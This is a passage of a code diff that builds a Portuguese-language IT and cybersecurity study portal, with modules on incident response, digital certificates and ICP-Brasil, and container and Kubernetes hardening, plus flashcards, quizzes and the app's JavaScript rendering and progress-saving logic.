+                <p class="text-slate-400">Reunião de <strong>Lições Aprendidas</strong>, relatório executivo, atualização de controles e notificação à ANPD/titulares (se houver risco relevante pela LGPD).</p>
+              </div>
+            </div>
+          </div>
+        `,
+        labType: 'incident-order',
+        flashcards: [
+          { q: 'Por que a fase de Contenção deve ocorrer antes da Erradicação em um incidente de ransomware?', a: 'Para isolar imediatamente os hosts infectados da rede e impedir que o ransomware continue se propagando e criptografando outros servidores enquanto a equipe investiga.' },
+          { q: 'O que é Cadeia de Custódia na forense computacional?', a: 'É a documentação cronológica rigorosa que garante a rastreabilidade, autenticidade e integridade das evidências digitais (hashes, coleta, armazenamento) para validade jurídica.' }
+        ],
+        quiz: [
+          {
+            question: 'Ao detectar uma estação de trabalho infectada por um malware que tenta se espalhar pela rede interna, qual deve ser a primeira ação operacional de resposta após confirmar o alerta?',
+            options: ['Formatar imediatamente o disco rígido apagando todos os logs', 'Isolar o equipamento da rede (Contenção)', 'Enviar um e-mail para toda a empresa pedindo para desligarem os computadores', 'Atualizar o sistema operacional da máquina comprometida'],
+            answer: 1,
+            explanation: 'A Contenção (como desconectar a máquina da rede ou isolá-la via EDR) impede a propagação lateral do ataque enquanto preserva a memória e evidências para análise.'
+          }
+        ]
+      },
+      {
+        id: 'sec-12',
+        track: 'SEC',
+        number: '12',
+        title: 'Assinatura e Certificação Digital, Dados em Trânsito e em Repouso',
+        shortDesc: 'ICP-Brasil, Certificados A1 e A3, Autoridade Certificadora, TLS/HTTPS e BitLocker/TDE.',
+        tags: ['Certificado Digital', 'ICP-Brasil', 'A1', 'A3', 'TLS', 'Assinatura Digital'],
+        summary: `
+          <p class="text-slate-300 leading-relaxed mb-4">
+            A <strong>Infraestrutura de Chaves Públicas (PKI / ICP-Brasil)</strong> vincula uma chave pública a uma identidade verificada por meio de um <strong>Certificado Digital</strong> (padrão X.509).
+          </p>
+          <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
+            <div class="p-4 rounded-xl bg-slate-900 border border-cyan-500/30">
+              <h4 class="text-cyan-400 font-semibold mb-2">Como funciona a Assinatura Digital?</h4>
+              <ol class="text-xs sm:text-sm text-slate-300 space-y-1.5 list-decimal list-inside">
+                <li>Gera-se um <strong>Hash</strong> (ex: SHA-256) do documento original.</li>
+                <li>O remetente cifra esse hash com sua <strong>Chave Privada</strong> (criando a assinatura).</li>
+                <li>O destinatário decifra a assinatura usando a <strong>Chave Pública</strong> do remetente e compara com um novo hash calculado do documento.</li>
+                <li>Garante <strong>Autenticidade, Integridade e Não-Repúdio</strong> (<em>não garante confidencialidade por si só!</em>).</li>
+              </ol>
+            </div>
+            <div class="p-4 rounded-xl bg-slate-900 border border-indigo-500/30">
+              <h4 class="text-indigo-400 font-semibold mb-2">Certificados A1 vs A3 & Hierarquia ICP-Brasil</h4>
+              <ul class="text-xs sm:text-sm text-slate-300 space-y-1.5 list-disc list-inside">
+                <li><strong>Tipo A1:</strong> Armazenado em software/arquivo (<code class="text-indigo-300">.pfx/.p12</code>) no computador/servidor. Validade de <strong>1 ano</strong>.</li>
+                <li><strong>Tipo A3:</strong> Armazenado em hardware criptográfico portátil (<strong>Token USB ou Smartcard</strong>). A chave privada nunca sai do chip. Validade de até <strong>3 a 5 anos</strong>.</li>
+                <li><strong>Entidades:</strong> AC Raiz (ITI) → Autoridade Certificadora (AC - emite/revoga via LCR/OCSP) → Autoridade de Registro (AR - valida presencialmente/videoconferência).</li>
+              </ul>
+            </div>
+          </div>
+          <div class="p-4 rounded-xl bg-slate-900 border border-slate-800 text-xs sm:text-sm text-slate-300">
+            <strong class="text-emerald-400">Dados em Trânsito vs Dados em Repouso:</strong><br/>
+            • <strong>Em Trânsito:</strong> Protegidos enquanto trafegam na rede usando <strong>TLS 1.2 / 1.3</strong> (HTTPS), IPsec VPN ou SSH.<br/>
+            • <strong>Em Repouso (At Rest):</strong> Protegidos enquanto armazenados em discos/bancos usando criptografia de disco completo (<strong>BitLocker</strong> no Windows, <strong>LUKS</strong> no Linux), <strong>TDE</strong> (Transparent Data Encryption em SGBDs) ou KMS na nuvem.
+          </div>
+        `,
+        labType: 'digital-sig',
+        flashcards: [
+          { q: 'Quais propriedades de segurança a Assinatura Digital garante e qual ela NÃO garante por padrão?', a: 'Garante Autenticidade, Integridade e Não-Repúdio. Ela NÃO garante Confidencialidade (pois o documento continua legível a menos que também seja cifrado).' },
+          { q: 'Qual a diferença de armazenamento e validade entre os certificados digitais A1 e A3?', a: 'O A1 é um arquivo digital instalado no computador/servidor com validade de 1 ano. O A3 fica armazenado em token USB ou smartcard com validade de até 3 a 5 anos.' }
+        ],
+        quiz: [
+          {
+            question: 'Na assinatura digital de um documento eletrônico, qual chave é utilizada pelo signatário para cifrar o resumo criptográfico (hash) do documento?',
+            options: ['A chave pública do destinatário', 'A chave privada do próprio signatário', 'Uma chave simétrica pública', 'A chave raiz da Autoridade de Registro'],
+            answer: 1,
+            explanation: 'O signatário utiliza sua própria Chave Privada para assinar o hash. Qualquer pessoa com sua Chave Pública poderá validar a autoria e a integridade.'
+          }
+        ]
+      },
+      {
+        id: 'sec-13',
+        track: 'SEC',
+        number: '13',
+        title: 'Segurança em Nuvens e de Contêineres (Docker, Kubernetes e DevSecOps)',
+        shortDesc: 'Isolamento de contêineres, imagens mínimas, Kubernetes RBAC/Secrets e esteira DevSecOps.',
+        tags: ['Docker', 'Kubernetes', 'Contêineres', 'DevSecOps', 'Secrets', 'Hardening'],
+        summary: `
+          <p class="text-slate-300 leading-relaxed mb-4">
+            Diferente de Máquinas Virtuais (que virtualizam hardware e possuem kernel próprio), <strong>Contêineres (Docker)</strong> compartilham o <strong>kernel do sistema operacional hospedeiro</strong>, isolando processos por meio de <em>Namespaces</em> e <em>Cgroups</em>. Isso exige controles rigorosos de segurança.
+          </p>
+          <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
+            <div class="p-4 rounded-xl bg-slate-900 border border-cyan-500/30">
+              <h4 class="text-cyan-400 font-semibold mb-2">Hardening de Contêineres (Docker)</h4>
+              <ul class="text-xs sm:text-sm text-slate-300 space-y-1.5 list-disc list-inside">
+                <li><strong>Não rodar como root:</strong> Definir diretiva <code class="text-cyan-300">USER nonroot</code> no Dockerfile para evitar escape de privilégios para o host.</li>
+                <li><strong>Imagens Mínimas (Distroless / Alpine):</strong> Reduzir a superfície de ataque removendo shells, compiladores e pacotes desnecessários.</li>
+                <li><strong>Scan de Imagens:</strong> Verificar vulnerabilidades (CVEs) nas camadas da imagem antes do deploy (ex: Trivy, Clair).</li>
+                <li><strong>Sistema de Arquivos Read-Only:</strong> Impedir gravações maliciosas dentro do contêiner em execução.</li>
+              </ul>
+            </div>
+            <div class="p-4 rounded-xl bg-slate-900 border border-indigo-500/30">
+              <h4 class="text-indigo-400 font-semibold mb-2">Segurança em Kubernetes (K8s) & DevSecOps</h4>
+              <ul class="text-xs sm:text-sm text-slate-300 space-y-1.5 list-disc list-inside">
+                <li><strong>Gestão de Segredos:</strong> Nunca colocar senhas/chaves no código ou Dockerfile; usar <em>Kubernetes Secrets</em> criptografados ou cofres como <strong>HashiCorp Vault / AWS Secrets Manager</strong>.</li>
+                <li><strong>Network Policies:</strong> Firewall interno do cluster K8s que restringe quais Pods podem se comunicar entre si.</li>
+                <li><strong>RBAC & Pod Security:</strong> Restringir permissões de API e bloquear contêineres em modo <code class="text-rose-400">--privileged</code>.</li>
+                <li><strong>DevSecOps (Shift-Left):</strong> Integrar segurança desde o planejamento e commit (IaC scanning, SAST, DAST, image signing).</li>
+              </ul>
+            </div>
+          </div>
+        `,
+        labType: 'docker-audit',
+        flashcards: [
+          { q: 'Por que o isolamento de um contêiner é considerado menos isolado que o de uma Máquina Virtual (VM)?', a: 'Porque os contêineres compartilham o mesmo kernel do sistema operacional hospedeiro (usando Namespaces e Cgroups), enquanto cada VM possui seu próprio sistema operacional e kernel completos.' },
+          { q: 'O que significa o conceito "Shift-Left" em DevSecOps?', a: 'Trazer os testes e controles de segurança para as fases mais iniciais do ciclo de desenvolvimento (código, build, IaC), detectando e corrigindo falhas mais cedo e com menor custo.' }
+        ],
+        quiz: [
+          {
+            question: 'Qual prática de segurança é altamente recomendada na construção de imagens Docker para reduzir a superfície de ataque e evitar comprometimento do host?',
+            options: ['Executar todos os processos internos como usuário root', 'Utilizar imagens mínimas (como Alpine ou Distroless) e definir um usuário não privilegiado (USER)', 'Incluir senhas de banco de dados em variáveis ENV dentro do Dockerfile', 'Habilitar sempre a flag --privileged'],
+            answer: 1,
+            explanation: 'Imagens mínimas reduzem pacotes vulneráveis e rodar como usuário não-root mitiga riscos caso ocorra vulnerabilidade na aplicação.'
+          }
+        ]
+      }
+    ];
+
+    // =========================================================================
+    // 2. ESTADO DA APLICAÇÃO E PERSISTÊNCIA (LOCALSTORAGE)
+    // =========================================================================
+    const STORAGE_KEY = 'portal_tecnologia_state_v1';
+
+    let appState = {
+      completedTopics: [], // array of topic IDs e.g. ['ti-1', 'sec-1']
+      quizScores: {},      // { 'ti-1': true }
+      activeView: 'home',  // 'home' or topic.id
+      filterTrack: 'ALL',  // 'ALL', 'TI', 'SEC'
+      searchQuery: ''
+    };
+
+    function loadState() {
+      try {
+        const saved = localStorage.getItem(STORAGE_KEY);
+        if (saved) {
+          const parsed = JSON.parse(saved);
+          appState = { ...appState, ...parsed };
+        }
+      } catch (e) {
+        console.warn('Não foi possível ler o localStorage:', e);
+      }
+    }
+
+    function saveState(showFeedback = false) {
+      try {
+        localStorage.setItem(STORAGE_KEY, JSON.stringify({
+          completedTopics: appState.completedTopics,
+          quizScores: appState.quizScores
+        }));
+        updateProgressUI();
+        if (showFeedback) showToast('Progresso salvo no navegador!');
+      } catch (e) {
+        console.warn('Erro ao salvar estado:', e);
+      }
+    }
+
+    function showToast(msg) {
+      const toast = document.getElementById('toast');
+      const toastMsg = document.getElementById('toast-msg');
+      toastMsg.textContent = msg;
+      toast.classList.remove('hidden');
+      toast.classList.add('flex');
+      clearTimeout(window._toastTimer);
+      window._toastTimer = setTimeout(() => {
+        toast.classList.add('hidden');
+        toast.classList.remove('flex');
+      }, 2600);
+    }
+
+    // =========================================================================
+    // 3. NAVEGAÇÃO E RENDERIZAÇÃO DA SIDEBAR
+    // =========================================================================
+    function toggleSidebar(open) {
+      const sidebar = document.getElementById('sidebar');
+      const backdrop = document.getElementById('sidebar-backdrop');
+      if (open) {
+        sidebar.classList.remove('-translate-x-full');
+        backdrop.classList.remove('hidden');
+      } else {
+        sidebar.classList.add('-translate-x-full');
+        backdrop.classList.add('hidden');
+      }
+    }
+
+    function updateProgressUI() {
+      const total = SYLLABUS.length;
+      const done = appState.completedTopics.length;
+      const pct = Math.round((done / total) * 100);
+
+      document.getElementById('sidebar-progress-text').textContent = `${pct}%`;
+      document.getElementById('sidebar-progress-bar').style.width = `${pct}%`;
+      document.getElementById('header-stats-badge').textContent = `${done} / ${total} concluídos`;
+      renderSidebar();
+    }
+
+    function renderSidebar() {
+      const nav = document.getElementById('sidebar-nav');
+      const tiTopics = SYLLABUS.filter(t => t.track === 'TI');
+      const secTopics = SYLLABUS.filter(t => t.track === 'SEC');
+
+      const buildGroup = (label, colorClass, badgeText, topics) => `
+        <div>
+          <div class="px-2.5 mb-2 flex items-center justify-between">
+            <span class="text-[11px] font-bold uppercase tracking-wider ${colorClass}">${label}</span>
+            <span class="text-[10px] font-mono px-1.5 py-0.5 rounded bg-slate-800 text-slate-400">${badgeText}</span>
+          </div>
+          <div class="space-y-1">
+            ${topics.map(t => {
+              const isDone = appState.completedTopics.includes(t.id);
+              const isActive = appState.activeView === t.id;
+              return `
+                <button onclick="navigateToTopic('${t.id}')"
+                  class="w-full text-left px-3 py-2 rounded-xl text-xs flex items-start gap-2.5 transition-all ${
+                    isActive
+                      ? 'bg-cyan-500/15 text-cyan-300 border border-cyan-500/30 font-semibold'
+                      : 'text-slate-300 hover:bg-slate-800/70 hover:text-white border border-transparent'
+                  }">
+                  <span class="mt-0.5 w-4 h-4 rounded-full flex-shrink-0 flex items-center justify-center text-[10px] font-bold ${
+                    isDone
+                      ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/40'
+                      : 'bg-slate-800 text-slate-400'
+                  }">
+                    ${isDone ? '✓' : t.number}
+                  </span>
+                  <span class="line-clamp-2 leading-snug">${t.title}</span>
+                </button>
+              `;
+            }).join('')}
+          </div>
+        </div>
+      `;
+
+      nav.innerHTML =
+        buildGroup('I. Tecnologia da Informação', 'text-cyan-400', `${tiTopics.filter(t => appState.completedTopics.includes(t.id)).length}/${tiTopics.length}`, tiTopics) +
+        buildGroup('II. Segurança Cibernética', 'text-indigo-400', `${secTopics.filter(t => appState.completedTopics.includes(t.id)).length}/${secTopics.length}`, secTopics);
+    }
+
+    function navigateToHome() {
+      appState.activeView = 'home';
+      toggleSidebar(false);
+      document.getElementById('breadcrumb').innerHTML = `<span class="text-cyan-400 font-semibold">Dashboard de Estudos</span>`;
+      renderSidebar();
+      renderDashboard();
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+
+    function navigateToTopic(topicId) {
+      const topic = SYLLABUS.find(t => t.id === topicId);
+      if (!topic) return;
+      appState.activeView = topicId;
+      toggleSidebar(false);
+
+      const trackName = topic.track === 'TI' ? 'I. Tecnologia da Informação' : 'II. Segurança Cibernética';
+      document.getElementById('breadcrumb').innerHTML = `
+        <button onclick="navigateToHome()" class="hover:text-cyan-400 transition">Dashboard</button>
+        <span>/</span>
+        <span class="hidden sm:inline text-slate-500">${trackName}</span>
+        <span class="hidden sm:inline">/</span>
+        <span class="text-cyan-400 font-semibold truncate max-w-[180px] sm:max-w-xs">${topic.number}. ${topic.title}</span>
+      `;
+
+      renderSidebar();
+      renderTopicView(topic);
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+
+    // =========================================================================
+    // 4. TELA INICIAL: DASHBOARD DE ESTUDOS
+    // =========================================================================
+    function renderDashboard() {
+      const main = document.getElementById('main-content');
+      const total = SYLLABUS.length;
+      const done = appState.completedTopics.length;
+      const pct = Math.round((done / total) * 100);
+
+      const tiTotal = SYLLABUS.filter(t => t.track === 'TI').length;
+      const tiDone = SYLLABUS.filter(t => t.track === 'TI' && appState.completedTopics.includes(t.id)).length;
+
+      const secTotal = SYLLABUS.filter(t => t.track === 'SEC').length;
+      const secDone = SYLLABUS.filter(t => t.track === 'SEC' && appState.completedTopics.includes(t.id)).length;
+
+      const filtered = SYLLABUS.filter(t => {
+        const matchTrack = appState.filterTrack === 'ALL' || t.track === appState.filterTrack;
+        const q = appState.searchQuery.trim().toLowerCase();
+        const matchSearch = !q ||
+          t.title.toLowerCase().includes(q) ||
+          t.shortDesc.toLowerCase().includes(q) ||
+          t.tags.some(tag => tag.toLowerCase().includes(q));
+        return matchTrack && matchSearch;
+      });
+
+      main.innerHTML = `
+        <!-- Hero Banner -->
+        <section class="relative overflow-hidden rounded-2xl bg-gradient-to-br from-slate-900 via-slate-900 to-indigo-950/60 border border-slate-800 p-6 sm:p-8 mb-6 glow-card">
+          <div class="max-w-3xl">
+            <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-cyan-500/10 border border-cyan-500/30 text-cyan-300 text-xs font-medium mb-3">
+              <span>⚡</span> Plataforma Interativa de Estudos & Laboratórios Práticos
+            </div>
+            <h2 class="text-2xl sm:text-3xl font-extrabold text-white tracking-tight mb-2">
+              Domine Tecnologia da Informação & Segurança Cibernética
+            </h2>
+            <p class="text-sm sm:text-base text-slate-300 leading-relaxed mb-5">
+              Explore os 23 módulos estruturados com resumos visuais, simuladores práticos embutidos (Terminal Linux/Windows, SQL Sandbox, Criptografia, Regras de Firewall), flashcards de memorização e quizzes comentados.
+            </p>
+            <div class="flex flex-wrap gap-3">
+              <button onclick="navigateToTopic('${SYLLABUS.find(t => !appState.completedTopics.includes(t.id))?.id || 'ti-1'}')"
+                class="px-5 py-2.5 rounded-xl bg-gradient-to-r from-cyan-500 to-indigo-600 hover:from-cyan-400 hover:to-indigo-500 text-white font-semibold text-sm shadow-lg shadow-cyan-500/20 transition flex items-center gap-2">
+                <span>Continuar Estudos</span>
+                <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 7l5 5m0 0l-5 5m5-5H6"/></svg>
+              </button>
+              <button onclick="openQuickReviewModal()"
+                class="px-4 py-2.5 rounded-xl bg-slate-800/90 hover:bg-slate-800 border border-slate-700 text-slate-200 font-medium text-sm transition">
+                Modo Revisão Rápida
+              </button>
+            </div>
+          </div>
+        </section>
+
+        <!-- Metrics Cards -->
+        <section class="grid grid-cols-1 sm:grid-cols-3 gap-4 mb-6">
+          <div class="p-4 rounded-2xl bg-slate-900/90 border border-slate-800">
+            <div class="flex items-center justify-between mb-2">
+              <span class="text-xs font-medium text-slate-400">Progresso Total</span>
+              <span class="text-xs font-mono font-bold text-cyan-400">${pct}%</span>
+            </div>
+            <div class="text-2xl font-bold text-white mb-2">${done} <span class="text-sm font-normal text-slate-400">de ${total} módulos</span></div>
+            <div class="w-full h-2 bg-slate-800 rounded-full overflow-hidden">
+              <div class="h-full bg-gradient-to-r from-cyan-500 to-emerald-400 rounded-full" style="width: ${pct}%"></div>
+            </div>
+          </div>
+
+          <div class="p-4 rounded-2xl bg-slate-900/90 border border-slate-800">
+            <div class="flex items-center justify-between mb-2">
+              <span class="text-xs font-medium text-cyan-400">I. Tecnologia da Informação</span>
+              <span class="text-xs font-mono text-slate-400">${Math.round((tiDone/tiTotal)*100)}%</span>
+            </div>
+            <div class="text-2xl font-bold text-white mb-2">${tiDone} <span class="text-sm font-normal text-slate-400">/ ${tiTotal} tópicos</span></div>
+            <div class="w-full h-2 bg-slate-800 rounded-full overflow-hidden">
+              <div class="h-full bg-cyan-500 rounded-full" style="width: ${(tiDone/tiTotal)*100}%"></div>
+            </div>
+          </div>
+
+          <div class="p-4 rounded-2xl bg-slate-900/90 border border-slate-800">
+            <div class="flex items-center justify-between mb-2">
+              <span class="text-xs font-medium text-indigo-400">II. Segurança Cibernética</span>
+              <span class="text-xs font-mono text-slate-400">${Math.round((secDone/secTotal)*100)}%</span>
+            </div>
+            <div class="text-2xl font-bold text-white mb-2">${secDone} <span class="text-sm font-normal text-slate-400">/ ${secTotal} tópicos</span></div>
+            <div class="w-full h-2 bg-slate-800 rounded-full overflow-hidden">
+              <div class="h-full bg-indigo-500 rounded-full" style="width: ${(secDone/secTotal)*100}%"></div>
+            </div>
+          </div>
+        </section>
+
+        <!-- Filter & Search Bar -->
+        <section class="flex flex-col md:flex-row items-stretch md:items-center justify-between gap-3 mb-6">
+          <div class="flex flex-wrap gap-2">
+            <button onclick="setTrackFilter('ALL')" class="px-3.5 py-2 rounded-xl text-xs font-semibold transition ${appState.filterTrack === 'ALL' ? 'bg-cyan-500 text-slate-950' : 'bg-slate-900 text-slate-300 border border-slate-800 hover:bg-slate-800'}">
+              Todos (${total})
+            </button>
+            <button onclick="setTrackFilter('TI')" class="px-3.5 py-2 rounded-xl text-xs font-semibold transition ${appState.filterTrack === 'TI' ? 'bg-cyan-500 text-slate-950' : 'bg-slate-900 text-slate-300 border border-slate-800 hover:bg-slate-800'}">
+              I. Tecnologia da Informação (${tiTotal})
+            </button>
+            <button onclick="setTrackFilter('SEC')" class="px-3.5 py-2 rounded-xl text-xs font-semibold transition ${appState.filterTrack === 'SEC' ? 'bg-indigo-500 text-white' : 'bg-slate-900 text-slate-300 border border-slate-800 hover:bg-slate-800'}">
+              II. Segurança Cibernética (${secTotal})
+            </button>
+          </div>
+
+          <div class="relative w-full md:w-80">
+            <svg class="w-4 h-4 text-slate-400 absolute left-3.5 top-1/2 -translate-y-1/2" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/></svg>
+            <input type="text" value="${appState.searchQuery}" oninput="setSearchQuery(this.value)"
+              placeholder="Buscar tópico, SQL, LGPD, Firewall..."
+              class="w-full pl-10 pr-4 py-2 rounded-xl bg-slate-900 border border-slate-800 focus:border-cyan-500 focus:outline-none text-sm text-slate-100 placeholder-slate-500" />
+          </div>
+        </section>
+
+        <!-- Syllabus Grid -->
+        <section class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+          ${filtered.length === 0 ? `
+            <div class="col-span-full p-10 rounded-2xl bg-slate-900/60 border border-slate-800 text-center">
+              <p class="text-slate-400 text-sm">Nenhum tópico encontrado para "<strong class="text-white">${appState.searchQuery}</strong>".</p>
+              <button onclick="setSearchQuery(''); setTrackFilter('ALL')" class="mt-3 px-4 py-2 rounded-xl bg-slate-800 text-cyan-400 text-xs font-medium">Limpar Filtros</button>
+            </div>
+          ` : filtered.map(t => {
+            const isDone = appState.completedTopics.includes(t.id);
+            const isTI = t.track === 'TI';
+            return `
+              <div onclick="navigateToTopic('${t.id}')"
+                class="group cursor-pointer rounded-2xl bg-slate-900/90 hover:bg-slate-900 border ${isDone ? 'border-emerald-500/30' : 'border-slate-800 hover:border-cyan-500/40'} p-5 flex flex-col justify-between transition-all hover:-translate-y-0.5 shadow-sm">
+                <div>
+                  <div class="flex items-center justify-between gap-2 mb-3">
+                    <span class="px-2.5 py-1 rounded-lg text-[10px] font-bold uppercase tracking-wider ${
+                      isTI ? 'bg-cyan-500/10 text-cyan-400 border border-cyan-500/20' : 'bg-indigo-500/10 text-indigo-400 border border-indigo-500/20'
+                    }">
+                      ${isTI ? 'TI' : 'Cibersegurança'} • Módulo ${t.number}
+                    </span>
+                    <span class="px-2 py-0.5 rounded-full text-[11px] font-medium ${
+                      isDone ? 'bg-emerald-500/15 text-emerald-400' : 'bg-slate-800 text-slate-400'
+                    }">
+                      ${isDone ? '✓ Estudado' : 'Pendente'}
+                    </span>
+                  </div>
+                  <h3 class="font-bold text-base text-white group-hover:text-cyan-300 transition mb-2 leading-snug">
+                    ${t.title}
+                  </h3>
+                  <p class="text-xs text-slate-400 leading-relaxed mb-4">
+                    ${t.shortDesc}
+                  </p>
+                </div>
+
+                <div>
+                  <div class="flex flex-wrap gap-1.5 mb-3">
+                    ${t.tags.slice(0, 3).map(tag => `<span class="px-2 py-0.5 rounded bg-slate-950 text-[10px] font-mono text-slate-400 border border-slate-800">${tag}</span>`).join('')}
+                  </div>
+                  <div class="pt-3 border-t border-slate-800/80 flex items-center justify-between text-xs font-medium text-cyan-400 group-hover:translate-x-0.5 transition-transform">
+                    <span>Abrir aula & laboratório</span>
+                    <span>→</span>
+                  </div>
+                </div>
+              </div>
+            `;
+          }).join('')}
+        </section>
+      `;
+    }
+
+    function setTrackFilter(track) {
+      appState.filterTrack = track;
+      renderDashboard();
+    }
+
+    function setSearchQuery(q) {
+      appState.searchQuery = q;
+      renderDashboard();
+    }
+
+    // =========================================================================
+    // 5. TELA INFORMATIVA E INTERATIVA DE CADA TÓPICO
+    // =========================================================================
+    function renderTopicView(topic) {
+      const main = document.getElementById('main-content');
+      const idx = SYLLABUS.findIndex(t => t.id === topic.id);
+      const prevTopic = idx > 0 ? SYLLABUS[idx - 1] : null;
+      const nextTopic = idx < SYLLABUS.length - 1 ? SYLLABUS[idx + 1] : null;
+      const isDone = appState.completedTopics.includes(topic.id);
+      const isTI = topic.track === 'TI';
+
+      main.innerHTML = `
+        <!-- Topic Header -->
+        <div class="rounded-2xl bg-slate-900/95 border border-slate-800 p-5 sm:p-7 mb-6">
+          <div class="flex flex-wrap items-center justify-between gap-3 mb-3">
+            <span class="px-3 py-1 rounded-lg text-xs font-bold uppercase tracking-wider ${
+              isTI ? 'bg-cyan-500/15 text-cyan-400 border border-cyan-500/30' : 'bg-indigo-500/15 text-indigo-400 border border-indigo-500/30'
+            }">
+              ${isTI ? 'I. Tecnologia da Informação' : 'II. Segurança Cibernética'} • Tópico ${topic.number}
+            </span>
+
+            <button onclick="toggleTopicCompletion('${topic.id}')"
+              class="px-4 py-2 rounded-xl text-xs font-semibold flex items-center gap-2 transition ${
+                isDone
+                  ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 hover:bg-emerald-500/30'
+                  : 'bg-slate-800 text-slate-200 border border-slate-700 hover:border-cyan-500/50'
+              }">
+              <span>${isDone ? '✓ Concluído (Desmarcar)' : '○ Marcar como Estudado'}</span>
+            </button>
+          </div>
+
+          <h2 class="text-xl sm:text-2xl lg:text-3xl font-extrabold text-white tracking-tight mb-2">
+            ${topic.title}
+          </h2>
+          <p class="text-sm text-slate-400">${topic.shortDesc}</p>
+        </div>
+
+        <!-- Section 1: Didactic Content -->
+        <section class="rounded-2xl bg-slate-900/70 border border-slate-800 p-5 sm:p-7 mb-6">
+          <div class="flex items-center gap-2.5 mb-4 pb-3 border-b border-slate-800">
+            <span class="w-8 h-8 rounded-lg bg-cyan-500/15 text-cyan-400 flex items-center justify-center font-bold text-sm">📘</span>
+            <div>
+              <h3 class="font-bold text-base sm:text-lg text-white">Guia Didático & Conceitos Essenciais</h3>
+              <p class="text-xs text-slate-400">Como funciona e como utilizar na prática</p>
+            </div>
+          </div>
+          <div class="prose-custom">
+            ${topic.summary}
+          </div>
+        </section>
+
+        <!-- Section 2: Interactive Hands-on Lab -->
+        <section class="rounded-2xl bg-slate-900/90 border border-cyan-500/30 p-5 sm:p-7 mb-6 shadow-lg shadow-cyan-950/20">
+          <div class="flex items-center justify-between gap-2 mb-4 pb-3 border-b border-slate-800">
+            <div class="flex items-center gap-2.5">
+              <span class="w-8 h-8 rounded-lg bg-emerald-500/15 text-emerald-400 flex items-center justify-center font-bold text-sm">🧪</span>
+              <div>
+                <h3 class="font-bold text-base sm:text-lg text-white">Laboratório Prático Interativo</h3>
+                <p class="text-xs text-slate-400">Experimente a tecnologia na prática diretamente no navegador</p>
+              </div>
+            </div>
+            <span class="px-2.5 py-1 rounded-full bg-emerald-500/10 text-emerald-400 text-[11px] font-mono">Hands-on</span>
+          </div>
+          <div id="interactive-lab-container">
+            ${buildInteractiveLab(topic)}
+          </div>
+        </section>
+
+        <!-- Section 3: Flashcards -->
+        <section class="rounded-2xl bg-slate-900/70 border border-slate-800 p-5 sm:p-7 mb-6">
+          <div class="flex items-center gap-2.5 mb-4 pb-3 border-b border-slate-800">
+            <span class="w-8 h-8 rounded-lg bg-indigo-500/15 text-indigo-400 flex items-center justify-center font-bold text-sm">🗂️</span>
+            <div>
+              <h3 class="font-bold text-base sm:text-lg text-white">Flashcards de Memorização Rápida</h3>
+              <p class="text-xs text-slate-400">Clique no cartão para virar e conferir a resposta</p>
+            </div>
+          </div>
+          <div class="grid grid-cols-1 md:grid-cols-${Math.min(topic.flashcards.length, 3)} gap-4">
+            ${topic.flashcards.map((fc, i) => `
+              <div onclick="this.querySelector('.fc-inner').classList.toggle('rotate-y-180')"
+                class="cursor-pointer perspective-1000 h-48 select-none">
+                <div class="fc-inner relative w-full h-full transition-transform duration-500 transform-style-3d">
+                  <!-- Front -->
+                  <div class="absolute inset-0 backface-hidden rounded-xl bg-slate-950 border border-slate-700/80 hover:border-indigo-500/50 p-4 flex flex-col justify-between">
+                    <span class="text-[10px] font-mono uppercase text-indigo-400">Pergunta #${i + 1} • Clique para virar</span>
+                    <p class="text-xs sm:text-sm font-semibold text-white leading-snug">${fc.q}</p>
+                    <span class="text-[11px] text-slate-500">↻ Ver resposta</span>
+                  </div>
+                  <!-- Back -->
+                  <div class="absolute inset-0 backface-hidden rotate-y-180 rounded-xl bg-indigo-950/90 border border-indigo-500/50 p-4 flex flex-col justify-between overflow-y-auto">
+                    <span class="text-[10px] font-mono uppercase text-emerald-400">Resposta</span>
+                    <p class="text-xs text-slate-100 leading-relaxed">${fc.a}</p>
+                    <span class="text-[11px] text-indigo-300">↻ Voltar</span>
+                  </div>
+                </div>
+              </div>
+            `).join('')}
+          </div>
+        </section>
+
+        <!-- Section 4: Interactive Mini-Quiz -->
+        <section class="rounded-2xl bg-slate-900/80 border border-slate-800 p-5 sm:p-7 mb-8">
+          <div class="flex items-center gap-2.5 mb-4 pb-3 border-b border-slate-800">
+            <span class="w-8 h-8 rounded-lg bg-amber-500/15 text-amber-400 flex items-center justify-center font-bold text-sm">🎯</span>
+            <div>
+              <h3 class="font-bold text-base sm:text-lg text-white">Verificação de Aprendizagem (Mini-Quiz)</h3>
+              <p class="text-xs text-slate-400">Responda corretamente para validar seu conhecimento neste módulo</p>
+            </div>
+          </div>
+
+          <div class="space-y-6">
+            ${topic.quiz.map((qItem, qIdx) => `
+              <div id="quiz-block-${qIdx}" class="p-4 rounded-xl bg-slate-950/80 border border-slate-800">
+                <p class="text-sm font-semibold text-white mb-3">${qIdx + 1}. ${qItem.question}</p>
+                <div class="space-y-2">
+                  ${qItem.options.map((opt, optIdx) => `
+                    <button onclick="answerQuiz('${topic.id}', ${qIdx}, ${optIdx})"
+                      id="quiz-opt-${qIdx}-${optIdx}"
+                      class="w-full text-left p-3 rounded-xl bg-slate-900 hover:bg-slate-800 border border-slate-800 text-xs sm:text-sm text-slate-300 transition flex items-center gap-3">
+                      <span class="w-6 h-6 rounded-lg bg-slate-800 text-slate-400 font-mono text-xs flex items-center justify-center flex-shrink-0">
+                        ${String.fromCharCode(65 + optIdx)}
+                      </span>
+                      <span>${opt}</span>
+                    </button>
+                  `).join('')}
+                </div>
+                <div id="quiz-feedback-${qIdx}" class="hidden mt-3 p-3 rounded-xl text-xs leading-relaxed"></div>
+              </div>
+            `).join('')}
+          </div>
+        </section>
+
+        <!-- Prev / Next Topic Footer Navigation -->
+        <div class="flex flex-col sm:flex-row items-stretch sm:items-center justify-between gap-3">
+          ${prevTopic ? `
